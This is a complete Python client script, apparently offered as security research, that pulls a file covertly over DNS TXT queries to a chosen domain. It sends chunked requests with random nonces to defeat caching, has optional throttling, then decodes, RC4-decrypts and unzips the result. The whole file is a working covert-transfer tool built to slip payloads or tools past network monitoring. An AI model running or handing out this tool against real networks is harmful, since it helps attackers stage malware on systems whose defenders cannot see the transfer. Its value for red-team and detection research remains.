#!/usr/bin/env python3
# -*- coding: utf8 -*-
"""
DNS Downloader - Client Side
Downloads files over DNS TXT records for covert file transfer.
Based on DNSExfiltrator concept but reversed direction.

Author: Security Research
"""

import argparse
import sys
import os
import random
import string
import time
from base64 import b64decode, b32decode
from io import BytesIO
import zipfile

# Import socket and dnslib for custom DNS server support
import socket
from dnslib import DNSRecord, QTYPE

# Also try dnspython for system DNS resolver
try:
    import dns.resolver
    USE_DNSPYTHON = True
except ImportError:
    USE_DNSPYTHON = False


#======================================================================================================
#                                       HELPERS FUNCTIONS
#======================================================================================================

class RC4:
    """RC4 decryption"""
    def __init__(self, key=None):
        self.state = list(range(256))
        self.x = self.y = 0
        if key is not None:
            self.key = key
            self.init(key)

    def init(self, key):
        for i in range(256):
            self.x = (ord(key[i % len(key)]) + self.state[i] + self.x) & 0xFF
            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
        self.x = 0

    def decrypt(self, data):
        output = [None] * len(data)
        for i in range(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])
        return bytearray(output)


def color(string, color=None):
    """Colorize terminal output"""
    attr = ['1']
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        elif color.lower() == "yellow":
            attr.append('33')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
        elif string.strip().startswith("[+]"):
            attr.append('32')
        elif string.strip().startswith("[*]"):
            attr.append('34')
        elif string.strip().startswith("[?]"):
            attr.append('33')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)


def generate_nonce(length=8):
    """Generate random nonce to bypass DNS caching"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def fromBase64URL(data):
    """Decode Base64URL to bytes"""
    data = data.replace('-', '+').replace('_', '/')
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return b64decode(data)


def fromBase32(data):
    """Decode Base32 to bytes"""
    data = data.upper()
    padding = 8 - len(data) % 8
    if padding != 8:
        data += '=' * padding
    return b32decode(data)


def progress(count, total, status=''):
    """Print progress bar"""
    bar_len = 50
    filled_len = int(round(bar_len * count / float(total)))
    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)
    sys.stdout.write('[%s] %s%s\t%s\r' % (bar, percents, '%', status))
    sys.stdout.flush()


def dns_query_dnspython(qname, dns_server=None):
    """Query DNS using dnspython library"""
    resolver = dns.resolver.Resolver()
    if dns_server:
        resolver.nameservers = [dns_server]
    resolver.timeout = 10
    resolver.lifetime = 10
    
    try:
        answers = resolver.resolve(qname, 'TXT')
        # Combine all TXT records
        result = ""
        for rdata in answers:
            for txt_string in rdata.strings:
                result += txt_string.decode('utf-8')
        return result
    except Exception as e:
        return None


def dns_query_socket(qname, dns_server, port=53, debug=False):
    """Query DNS using raw socket and dnslib"""
    try:
        # Build DNS query
        query = DNSRecord.question(qname, 'TXT')
        
        if debug:
            print(f"[DEBUG] Querying {qname} via {dns_server}:{port}")
        
        # Send query
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(10)
        sock.sendto(query.pack(), (dns_server, port))
        
        # Receive response
        data, _ = sock.recvfrom(4096)
        sock.close()
        
        if debug:
            print(f"[DEBUG] Received {len(data)} bytes")
        
        # Parse response
        response = DNSRecord.parse(data)
        
        # Extract TXT data
        result = ""
        for rr in response.rr:
            if rr.rtype == QTYPE.TXT:
                for txt_part in rr.rdata.data:
                    if isinstance(txt_part, bytes):
                        result += txt_part.decode('utf-8')
                    else:
                        result += str(txt_part)
        return result if result else None
    except Exception as e:
        print(color(f"[DEBUG] Socket error: {e}"))
        return None


def dns_query(qname, dns_server=None, port=53):
    """Unified DNS query function"""
    if USE_DNSPYTHON and dns_server is None:
        return dns_query_dnspython(qname, dns_server)
    else:
        if dns_server is None:
            dns_server = "8.8.8.8"
        return dns_query_socket(qname, dns_server, port)


#======================================================================================================
#                                           MAIN
#======================================================================================================

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DNS Downloader Client - Download files over DNS')
    parser.add_argument("-d", "--domain", help="Domain name for DNS requests", dest="domain", required=True)
    parser.add_argument("-p", "--password", help="Password for decryption", dest="password", required=True)
    parser.add_argument("-s", "--server", help="DNS server IP (optional)", dest="dns_server", default=None)
    parser.add_argument("-P", "--port", help="DNS server port (default: 53)", dest="port", type=int, default=53)
    parser.add_argument("-o", "--output", help="Output file path (optional)", dest="output", default=None)
    parser.add_argument("-t", "--throttle", help="Delay between requests in ms (default: 0)", dest="throttle", type=int, default=0)
    parser.add_argument("-r", "--retries", help="Max retries per chunk (default: 3)", dest="retries", type=int, default=3)
    args = parser.parse_args()

    print(color("[*] DNS Downloader Client"))
    print(color(f"[*] Target domain: {args.domain}"))
    if args.dns_server:
        print(color(f"[*] Using DNS server: {args.dns_server}:{args.port}"))

    # Step 1: Get file metadata (INIT request)
    print(color("\n[*] Sending INIT request..."))
    init_query = f"init.{args.domain}"
    
    metadata_response = dns_query(init_query, args.dns_server, args.port)
    
    if not metadata_response:
        print(color("[!] Failed to get metadata from server"))
        sys.exit(1)

    try:
        parts = metadata_response.split('|')
        filename = parts[0]
        total_chunks = int(parts[1])
        encoding = parts[2]
        checksum = int(parts[3])
        
        print(color(f"[+] File: {filename}"))
        print(color(f"[+] Total chunks: {total_chunks}"))
        print(color(f"[+] Encoding: {encoding}"))
        print(color(f"[+] Checksum: {checksum}"))
    except Exception as e:
        print(color(f"[!] Failed to parse metadata: {e}"))
        print(color(f"[!] Response was: {metadata_response}"))
        sys.exit(1)

    # Step 2: Download all chunks
    print(color("\n[*] Downloading chunks..."))
    encoded_data = ""
    
    for chunk_num in range(total_chunks):
        retries = 0
        success = False
        
        while retries < args.retries and not success:
            nonce = generate_nonce()
            chunk_query = f"chunk-{chunk_num}.{nonce}.{args.domain}"
            
            chunk_response = dns_query(chunk_query, args.dns_server, args.port)
            
            if chunk_response and chunk_response != "ERROR":
                encoded_data += chunk_response
                success = True
            else:
                retries += 1
                if retries < args.retries:
                    time.sleep(0.5)  # Wait before retry
        
        if not success:
            print(color(f"\n[!] Failed to download chunk {chunk_num} after {args.retries} retries"))
            sys.exit(1)
        
        progress(chunk_num + 1, total_chunks, f"Chunk {chunk_num + 1}/{total_chunks}")
        
        if args.throttle > 0:
            time.sleep(args.throttle / 1000.0)

    print(color(f"\n[+] Downloaded {len(encoded_data)} bytes of encoded data"))

    # Step 3: Decode
    print(color("[*] Decoding data..."))
    try:
        if encoding == "base32":
            encrypted_data = fromBase32(encoded_data)
        else:
            encrypted_data = fromBase64URL(encoded_data)
        print(color(f"[+] Decoded size: {len(encrypted_data)} bytes"))
    except Exception as e:
        print(color(f"[!] Failed to decode data: {e}"))
        sys.exit(1)

    # Step 4: Decrypt (RC4)
    print(color("[*] Decrypting data..."))
    try:
        rc4 = RC4(args.password)
        decrypted_data = rc4.decrypt(bytearray(encrypted_data))
        print(color(f"[+] Decrypted size: {len(decrypted_data)} bytes"))
    except Exception as e:
        print(color(f"[!] Failed to decrypt data: {e}"))
        sys.exit(1)

    # Step 5: Decompress (ZIP)
    print(color("[*] Decompressing data..."))
    try:
        zip_buffer = BytesIO(bytes(decrypted_data))
        with zipfile.ZipFile(zip_buffer, 'r') as zf:
            # Get the first file in the archive
            file_list = zf.namelist()
            if not file_list:
                print(color("[!] ZIP archive is empty"))
                sys.exit(1)
            
            original_filename = file_list[0]
            file_content = zf.read(original_filename)
            
        print(color(f"[+] Decompressed size: {len(file_content)} bytes"))
    except Exception as e:
        print(color(f"[!] Failed to decompress data: {e}"))
        sys.exit(1)

    # Step 6: Verify checksum
    calculated_checksum = sum(file_content) & 0xFFFFFFFF
    if calculated_checksum == checksum:
        print(color("[+] Checksum verified successfully!"))
    else:
        print(color(f"[!] Checksum mismatch! Expected: {checksum}, Got: {calculated_checksum}"))
        print(color("[?] File may be corrupted, but will save anyway..."))

    # Step 7: Save file
    output_path = args.output if args.output else original_filename
    try:
        with open(output_path, 'wb') as f:
            f.write(file_content)
        print(color(f"\n[+] File saved successfully: {output_path}"))
        print(color(f"[+] Size: {len(file_content)} bytes"))
    except Exception as e:
        print(color(f"[!] Failed to save file: {e}"))
        sys.exit(1)

    print(color("\n[+] Download complete!"))

